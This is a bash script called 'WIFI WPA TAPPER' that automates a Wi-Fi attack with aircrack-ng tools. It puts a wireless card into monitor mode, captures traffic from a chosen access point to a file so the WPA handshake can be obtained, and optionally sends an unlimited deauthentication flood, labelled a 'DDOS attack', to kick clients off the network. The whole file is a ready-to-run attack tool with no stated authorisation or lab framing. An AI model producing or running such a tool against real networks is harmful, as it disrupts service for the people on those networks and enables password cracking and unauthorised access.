#!/bin/bash

red="\e[31m"
green="\e[32m"
white="\e[1;37m"
default="\e[0m"

function error_handle(){
    if [[ $? -ne 0 ]]; then
        echo -e "$red[!] $1 $default"
        exit 1
    fi
}

function kill_process(){
    sudo airmon-ng check kill > /dev/null
    error_handle "Error during killing process ..."
}

function monitor_mode_on(){
    sudo airmon-ng start "$1"
    error_handle "Error during putting $1 in monitor mode ..."
}

function monitor_mode_off(){
    local process_id=$(pgrep airodump-ng)
    sudo kill "$process_id" >> /dev/null
    error_handle "Error killing process .."    
    sudo ifconfig "$1" down
    sudo iwconfig "$1" mode managed
    error_handle "Error during putting $1 in managed mode!!"
    sudo ifconfig "$1" up
    echo -e "$green[*] Starting Network Manager $default"
    sudo systemctl start NetworkManager
    error_handle "Error Starting Network Manager !!"
    echo "Done!!"
}

function access_point_MAC(){
    sudo airodump-ng "$1"
    error_handle "Error during getting access point MAC address"
}

function window1(){
    gnome-terminal -- bash -c "sudo airodump-ng -w $1 -c $2 --bssid $3 $4; exec bash"
    sudo iw dev "$4" set channel "$2"
    error_handle "Error putting $4 on channel $2 ..."
}

function deauthentication(){
    sudo aireplay-ng --deauth 0 -a "$1" "$2"
    error_handle "Error During Deauthentication ..."
}

function interface1(){
    local ifaces=()
    while IFS= read -r line; do
        if [[ $line =~ ^([a-zA-Z0-9]+): ]]; then
            ifaces+=("${BASH_REMATCH[1]}")
        fi
    done < <(ifconfig)
    echo "${ifaces[@]}"
}

if [[ $EUID -ne 0 ]]; then
    echo -e "$red Please run script as root $default"
    exit 1
fi

echo -e "$white ******************** WIFI WPA TAPPER ***************************** $default"

echo "********* INTERFACES AVAILABLE ***********"
ifaces=($(interface1))
index=1
for face in "${ifaces[@]}"; do
    echo "$index> $face"
    ((index++))
done
echo "******************************************"

read -p "Choose the interface number -> " ch
interface=${ifaces[$ch-1]}
trap "monitor_mode_off '$interface'" EXIT

echo -e "${green}[*] Killing All the conflicting process${default}"
kill_process

echo -e "${green}[*] Putting $interface in monitor mode${default}"
monitor_mode_on "$interface"

access_point_MAC "$interface"

echo -e "${green}[*] Preparing capture folder${default}"
read -p "Enter Wi-Fi name (SSID) -> " ssid
ssid_cleaned=$(echo "$ssid" | tr ' ' '_')
file_dir="/home/qwerty/captures/$ssid_cleaned"

mkdir -p "$file_dir"
error_handle "Error creating capture directory!"

file="$file_dir/${ssid_cleaned}_capture"
read -p "Enter BSSID -> " bssid

read -p "Enter channel -> " channel


window1 "$file" "$channel" "$bssid" "$interface"

read -p "Do you wish to do a DDOS attack [N/Y] ?" choice 
if [[ "$choice" != 'N' && "$choice" != 'n' ]]; then
    echo -e "${green}[*] Sending Deauthentication Packets to $bssid From $interface $default"
    deauthentication "$bssid" "$interface"
else
    echo -e "$red[!] No Deauth Packets sent $default"
fi

echo -e "$green[*] Putting $interface in managed mode $default"
monitor_mode_off "$interface"
